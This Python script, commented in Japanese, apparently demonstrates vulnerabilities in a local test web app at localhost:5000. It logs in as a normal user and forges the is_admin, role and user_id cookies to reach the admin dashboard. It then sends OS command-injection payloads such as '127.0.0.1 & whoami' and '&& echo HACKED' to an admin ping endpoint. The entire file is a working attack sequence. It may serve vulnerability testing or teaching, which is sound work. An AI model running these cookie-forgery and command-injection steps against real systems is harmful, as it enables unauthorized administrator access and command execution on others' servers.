#!/usr/bin/env python3
"""
権限昇格脆弱性のデモンストレーション
Cookie操作による管理者権限の奪取
"""

import requests
from urllib.parse import urlencode
import json

def test_privilege_escalation():
    print("=== 権限昇格脆弱性テスト ===\n")
    
    base_url = "http://localhost:5000"
    
    # 1. 通常ユーザーでログイン
    print("1. 通常ユーザーでログイン試行...")
    login_data = {
        'username': 'test1001',  # 通常ユーザー
        'password': 'password123'
    }
    
    session = requests.Session()
    response = session.post(f"{base_url}/login", data=login_data)
    print(f"ログイン結果: {response.status_code}")
    print(f"現在のCookie: {dict(session.cookies)}")
    
    # 2. 通常状態で管理者ページにアクセス試行
    print("\n2. 通常状態で管理者ページアクセス試行...")
    admin_response = session.get(f"{base_url}/admin")
    print(f"管理者ページアクセス結果: {admin_response.status_code}")
    if "管理者権限が必要です" in admin_response.text:
        print("✅ 正常: 管理者権限が必要というメッセージが表示")
    
    # 3. Cookie操作による権限昇格攻撃
    print("\n3. 🚨 権限昇格攻撃実行...")
    
    # 危険: Cookieを手動で変更して管理者権限を偽装
    session.cookies.set('is_admin', 'true')
    session.cookies.set('user_id', '1')
    session.cookies.set('role', 'admin')
    
    print(f"偽装後のCookie: {dict(session.cookies)}")
    
    # 4. 偽装された権限で管理者ページにアクセス
    print("\n4. 偽装権限で管理者ページアクセス...")
    admin_response = session.get(f"{base_url}/admin")
    print(f"管理者ページアクセス結果: {admin_response.status_code}")
    
    if admin_response.status_code == 200 and "管理者ダッシュボード" in admin_response.text:
        print("🚨 権限昇格成功: 管理者ダッシュボードにアクセス可能！")
        
        # 5. 管理者機能の悪用テスト
        print("\n5. 管理者機能の悪用テスト...")
        
        # ユーザー情報の取得
        users_response = session.get(f"{base_url}/admin/users")
        if users_response.status_code == 200:
            print("✅ ユーザー管理ページアクセス成功")
        
        # システム情報の取得（コマンドインジェクション脆弱性テスト）
        print("\n6. 🚨 コマンドインジェクション脆弱性テスト...")
        
        # 危険: OSコマンドインジェクション攻撃
        dangerous_payloads = [
            "127.0.0.1",  # 正常なping
            "127.0.0.1 && echo 'HACKED'",  # コマンドインジェクション
            "127.0.0.1 & whoami",  # ユーザー名取得
            "127.0.0.1 & dir" if "windows" in session.get(f"{base_url}/").text.lower() else "127.0.0.1 & ls"  # ディレクトリ一覧
        ]
        
        for payload in dangerous_payloads:
            system_response = session.get(f"{base_url}/admin/system?target={payload}")
            if system_response.status_code == 200:
                print(f"ペイロード '{payload}': ✅ 実行成功")
                if "HACKED" in system_response.text or "Administrator" in system_response.text or "root" in system_response.text:
                    print("🚨 コマンドインジェクション成功！")
        
        print("\n=== 攻撃結果 ===")
        print("🚨 重大な脆弱性が確認されました:")
        print("1. Cookie操作による権限昇格")
        print("2. 管理者機能への不正アクセス")
        print("3. コマンドインジェクション（OSコマンド実行）")
        print("4. 全ユーザー情報への不正アクセス")
        
    else:
        print("❌ 権限昇格失敗")

if __name__ == "__main__":
    test_privilege_escalation()